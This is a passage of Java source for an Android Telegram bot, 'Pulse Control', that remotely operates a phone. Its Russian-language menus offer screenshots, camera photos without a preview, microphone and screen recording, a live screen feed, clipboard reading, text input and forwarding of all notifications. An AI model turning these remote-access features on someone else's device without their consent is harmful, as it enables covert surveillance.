        StringBuilder sb = new StringBuilder("🎬 <b>Макросы</b>\n\nСценарии: одно нажатие — пачка действий.\n\n");
        JSONArray m = Config.macros(this);
        for (int i = 0; i < m.length(); i++) {
            JSONObject o = m.optJSONObject(i);
            if (o == null) continue;
            sb.append("• <b>").append(o.optString("name")).append("</b> — <code>")
                    .append(o.optString("acts")).append("</code>\n");
        }
        sb.append("\n➕ Создать свой или ▶️ запустить.\n\n").append(Sys.footer(this));
        return sb.toString();
    }

    private String textDigest() {
        boolean on = Config.digestHour(this) >= 0;
        return "📰 <b>Ежедневный дайджест</b>\n\nСтатус: " + (on ? "✅ включён в " + Config.digestHour(this) + ":00" : "⛔ выключен")
                + "\n\nРаз в сутки пришлю: батарею, сеть, уведомления за день, топ статистику.\n\n" + Sys.footer(this);
    }

    private String textWatchdog() {
        return "🔁 <b>Watchdog</b>\n\nПроверяю движок раз в минуту. Если бот молчит >5 минут — "
                + "перезапускаю службу и сообщаю вам.\n\n"
                + "Статус: " + (BotService.isUp() ? "🟢 движок работает" : "🔴 движок молчит") + "\n\n" + Sys.footer(this);
    }

    private static String tail(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(s.length() - max);
    }

    private String trigDump(Context c) {
        JSONArray a = Config.triggers(c);
        if (a.length() == 0) return "<i>Правил пока нет</i>";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < a.length(); i++) {
            JSONObject o = a.optJSONObject(i);
            if (o == null) continue;
            sb.append("• 📶 ").append(o.optString("ssid")).append(" → <code>").append(o.optString("act")).append("</code>\n");
        }
        return sb.toString();
    }

    private void runMacro(long chat, String name, JSONArray acts) {
        if (acts == null) return;
        LogStore.add("🎬 Макрос: " + name);
        for (int i = 0; i < acts.length(); i++) {
            String act = acts.optString(i, "");
            String cmd = act, arg = "";
            int colon = act.indexOf(':');
            if (colon > 0) { cmd = act.substring(0, colon); arg = act.substring(colon + 1); }
            Background.runAction(this, cmd, arg);
            try { Thread.sleep(400); } catch (InterruptedException ignored) {}
        }
        api.sendMessage(chat, "🎬 <b>Макрос «" + esc(name) + "» выполнен</b>\n\n" + Sys.footer(this), Kb.macroPanel(Config.macros(this)));
    }

    // ------------------------------------------------------------ files from Telegram

    private void receiveFile(long chat, JSONObject msg) {
        try {
            String mode = Act.modeFresh() ? Act.mode() : null;
            JSONObject photo = msg.optJSONObject("photo") != null ? null : null;
            String fileId = null;
            String nameTmp = "file.bin";
            if (msg.has("photo")) {
                JSONArray sizes = msg.getJSONArray("photo");
                JSONObject best = sizes.optJSONObject(sizes.length() - 1);
                if (best != null) { fileId = best.optString("file_id"); nameTmp = "photo_" + System.currentTimeMillis() + ".jpg"; }
            } else if (msg.has("document")) {
                JSONObject doc = msg.getJSONObject("document");
                fileId = doc.optString("file_id");
                nameTmp = doc.optString("file_name", "file.bin");
            }
            if (fileId == null) return;
            final String name = nameTmp;
            api.sendMessage(chat, "⬇️ Скачиваю файл…", null);
            String fid = fileId;
            new Thread(() -> {
                try {
                    Http.Resp r = api.getFile(fid);
                    if (!r.ok()) { api.sendMessage(chat, "⚠️ Telegram не дал файл: " + r.description(), null); return; }
                    String path = new JSONObject(r.body).getJSONObject("result").optString("file_path");
                    byte[] data = Http.downloadTelegramFile(cfg.token, path, 120000);
                    if (data == null) { api.sendMessage(chat, "⚠️ Не скачалось", null); return; }
                    LogStore.add("📥 Файл из TG: " + name + " (" + (data.length / 1024) + " КБ)");

                    if (mode != null && mode.equals("wall")) {
                        boolean ok = Tools.setWallpaper(this, data);
                        Act.clearMode();
                        api.sendMessage(chat, ok ? "🖼 <b>Обои установлены!</b>" : "🖼 Не удалось поставить обои", Kb.catMedia());
                        return;
                    }
                    if (mode != null && mode.equals("fromtg")) {
                        boolean ok = Fs.write("/Download/" + name, data);
                        Act.clearMode();
                        api.sendMessage(chat, ok ? "📥 <b>Сохранено:</b> <code>sdcard/Download/" + esc(name) + "</code>"
                                : "⚠️ Не удалось сохранить (нужно разрешение на файлы)", Kb.catMedia());
                        return;
                    }
                    // default: save into Download + offer wallpaper
                    boolean ok = Fs.write("/Download/" + name, data);
                    api.sendMessage(chat, (ok ? "📥 Сохранено: <code>sdcard/Download/" + esc(name) + "</code>"
                            : "⚠️ Сохранить не смог"), TgApi.kb(TgApi.row(TgApi.btn("🖼 Поставить на обои", "m:wall"))));
                } catch (Exception e) {
                    api.sendMessage(chat, "⚠️ " + e.getMessage(), null);
                }
            }, "pulse-dl").start();
        } catch (Exception e) {
            LogStore.add("📥 " + e.getMessage());
        }
    }

    public static void stopSiren() {
        try { if (sirenStop != null) sirenStop.run(); } catch (Exception ignored) {}
        sirenStop = null;
    }

    private void sosBlink() {
        new Thread(() -> {
            for (int i = 0; i < 10; i++) {
                Tools.torch(this, i % 2 == 0);
                try { Thread.sleep(500); } catch (InterruptedException e) { break; }
            }
            Tools.torch(this, false);
        }, "pulse-sos").start();
    }

    private String nowPlaying() {
        try {
            android.media.session.MediaSessionManager msm =
                    (android.media.session.MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE);
            List<android.media.session.MediaController> list = msm.getActiveSessions(null);
            if (list != null) {
                for (android.media.session.MediaController mc : list) {
                    android.media.MediaMetadata md = mc.getMetadata();
                    if (md != null) {
                        String t = md.getString(android.media.MediaMetadata.METADATA_KEY_TITLE);
                        String a = md.getString(android.media.MediaMetadata.METADATA_KEY_ARTIST);
                        if (t != null) return t + (a == null ? "" : " — " + a);
                    }
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ================================================================== panels

    private void sendPanel(long chat) { api.sendMessage(chat, textMain(), Kb.main()); }

    private String textMain() {
        return "⚡ <b>Pulse Control</b> <i>v2.0</i>\n"
                + "👤 <b>" + esc(Sys.deviceName()) + "</b> · 🕒 " + Sys.time() + "\n\n"
                + "📸 Скриншот · 🏠 Домой · 📷 Фото\n"
                + "🎥 Запись · 🖥 Трансляция · 🎙 Голос\n"
                + "⌨️ Ввод · 🚀 Приложения · 📳 🔦 🆘\n\n"
                + Sys.footer(this);
    }

    private String textMore() {
        return "⚙️ <b>Дополнительно</b>\n\n"
                + "🌐 ссылки · 🔆 яркость · 📁 файлы\n"
                + "🕶 что открыто · ⏰ отложенные · 🌡 алерты\n"
                + "👥 админы · 🔐 PIN · 🖼 график · 🧨 паника\n\n"
                + Sys.footer(this);
    }

    private String textStat() {
        int pct = Sys.batteryPercent(this);
        return "📊 <b>Статус устройства</b>\n\n"
                + "👤 " + esc(Sys.deviceName()) + "\n"
                + "🤖 Android " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n"
                + "🕒 " + Sys.time() + "\n\n"
                + "🔋 Батарея: <b>" + pct + "%</b>" + (Sys.charging(this) ? " (заряжается)" : "") + "\n"
                + "🌡 Температура: " + String.format(Locale.getDefault(), "%.1f", Sys.batteryTemp(this)) + "°C\n"
                + "🌐 Сеть: " + Sys.netName(this) + "\n\n"
                + "⏱ Аптайм бота: " + Sys.uptime() + "\n🧮 Команд: " + cmdCount + "\n"
                + "📶 Пинг: " + (lastPing >= 0 ? lastPing + " мс" : "—") + "\n"
                + "🧠 RAM: " + Sys.freeRam(this) + " · 💾 " + Sys.freeStorage();
    }

    private String textVolume() {
        int[] v = Sys.musicVolume(this);
        int[] r = Sys.ringVolume(this);
        return "🔊 <b>Громкость</b>\n\n"
                + "Музыка <code>" + bar(v[0] * 100 / v[1]) + "</code> <b>" + (v[0] * 100 / v[1]) + "%</b>\n"
                + "Звонок <code>" + bar(r[0] * 100 / r[1]) + "</code> <b>" + (r[0] * 100 / r[1]) + "%</b>\n\n"
                + Sys.footer(this);
    }

    private static String bar(int pct) {
        StringBuilder sb = new StringBuilder();
        int filled = Math.round(pct / 10f);
        for (int i = 0; i < 10; i++) sb.append(i < filled ? "█" : "░");
        return sb.toString();
    }

    private String textVib() {
        return "📳 <b>Вибрация</b>\n\nВыберите длительность — телефон задрожит с нарастающим ритмом.\n\n" + Sys.footer(this);
    }

    private String textTorch() {
        return "🔦 <b>Фонарик</b>\n\nСейчас: <b>" + (Tools.torchState() ? "включён" : "выключен") + "</b>\n\n" + Sys.footer(this);
    }

    private String textFind() {
        return "🆘 <b>Найти телефон</b>\n\n"
                + "Телефон заорёт на максимуме громкости, завибрирует и мигнёт фонарём.\n"
                + "<i>Полезно, когда потеряли телефон дома.</i>\n\n" + Sys.footer(this);
    }

    private String textCam() {
        return "📷 <b>Камера</b>\n\nВыберите камеру. Фото придёт сюда.\n"
                + "<i>Совет: снимайте при свете — без превью камера работает «вслепую».</i>\n\n" + Sys.footer(this);
    }

    private String textRec() {
        boolean ok = Config.projValid(this);
        return "🎥 <b>Запись экрана</b>\n\n"
                + (ok ? "✅ Разрешение есть — можно записывать до 3 часов.\n" : "🔑 Нужно разово подтвердить запись на телефоне.\n")
                + "\nВыберите длительность:\n" + Sys.footer(this);
    }

    private String textMic() {
        return "🎙 <b>Микрофон</b>\n\nВыберите длительность — пришлю аудио в чат.\n\n" + Sys.footer(this);
    }

    private String textLive() {
        return "🖥 <b>Живой экран</b>\n\nБуду присылать кадр экрана каждые 3 секунды (60 сек).\n\n" + Sys.footer(this);
    }

    private String textText() {
        return "⌨️ <b>Ввод текста</b>\n\nВведу текст в активное поле на телефоне.\n\n"
                + "• <b>В активное поле</b> — куда сейчас стоит курсор\n"
                + "• <b>По названию поля</b> — найду поле по подсказке\n\n" + Sys.footer(this);
    }

    private String textApps() {
        return "🚀 <b>Приложения</b>\n\nВыберите из списка или просто напишите название:\n"
                + "<code>открой ютуб</code>, <code>открой камера</code>\n\n"
                + "Установлено: <b>" + appsSession.size() + "</b>\n\n" + Sys.footer(this);
    }

    private String textMedia() {
        return "🎵 <b>Медиа-пульт</b>\n\nУправляйте музыкой на телефоне.\n\n" + Sys.footer(this);
    }

    private String textClip() {
        String now = Sys.clipboard(this);
        return "📋 <b>Буфер обмена</b>\n\n"
                + (now == null || now.isEmpty() ? "<i>Пусто</i>" : "<code>" + esc(clipPreview(now)) + "</code>")
                + "\n\n" + Sys.footer(this);
    }

    private static String clipPreview(String s) {
        s = s.replace("\n", " ");
        return s.length() > 300 ? s.substring(0, 300) + "…" : s;
    }

    private String textBright() {
        return "🔆 <b>Яркость экрана</b>\n\nСейчас: <b>" + (Sys.brightness(this) * 100 / 255) + "%</b>\n\n"
                + Sys.footer(this);
    }

    private String textNotif() {
        return "🔔 <b>Пересылка уведомлений</b>\n\n"
                + (Config.notifOn(this) ? "✅ Включена" : "⛔ Выключена") + "\n"
                + (NotifyHook.connected ? "🟢 Служба уведомлений подключена" : "🔴 Служба уведомлений не подключена") + "\n\n"
                + "Игнор-лист: " + Config.notifIgnore(this).size() + " прил.\n\n"
                + "<i>Включается в приложении: «Доступ к уведомлениям».</i>\n\n" + Sys.footer(this);
    }

    private String textIgnore() {
        StringBuilder sb = new StringBuilder("🚫 <b>Игнор-лист</b>\n\n");
        java.util.Set<String> ign = Config.notifIgnore(this);
        if (ign.isEmpty()) sb.append("<i>пусто</i>");
        else for (String p : ign) sb.append("• <code>").append(p).append("</code>\n");
        sb.append("\nОтключить пересылку приложения — пришлите пакет:\n<code>/ignore com.example.app</code>");
        return sb.toString();
    }

    private String textSched() {
        String d = Sched.dump(this);
        return "⏰ <b>Отложенные команды</b>\n\n" + (d.isEmpty() ? "<i>Пусто</i>\n" : d) + "\n" + Sys.footer(this);
    }

    private String textAlerts() {
        return "🌡 <b>Алерты</b>\n\nПрисылаю сообщения сам, когда что-то происходит:\n"
                + "батарея садится, началась зарядка, пропала сеть, перегрев.\n\n"
                + "Нажмите, чтобы включить/выключить.\n\n" + Sys.footer(this);
    }

    private String textAdmins() {
        StringBuilder sb = new StringBuilder("👥 <b>Админы</b>\n\nВладелец: <code>")
                .append(Config.get(this).admin).append("</code>\n");
        for (Long a : Config.admins(this)) {
            if (a == Config.get(this).adminId()) continue;
            sb.append("• <code>").append(a).append("</code>\n");
        }
        sb.append("\n<i>Доверенное лицо получит доступ к пульту.</i>");
        return sb.toString();
    }

    private String textPin() {
        Config c = Config.get(this);
        boolean has = c.pin != null && c.pin.length() >= 4;
        return "🔐 <b>PIN-код</b>\n\n" + (has ? "Сейчас: <b>включён</b>" : "Сейчас: <b>выключен</b>")
                + "\n\nPIN защищает бота, если кто-то получит доступ к чату.";
    }

    private String textPanic() {
        return "🧨 <b>Паника</b>\n\nСотрёт токен бота — бот мгновенно перестанет отвечать кому-либо.\n"
                + "Используйте, если телефон потерян и есть риск.\n\n"
                + "Восстановить: открыть приложение и вставить новый токен у @BotFather.";
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
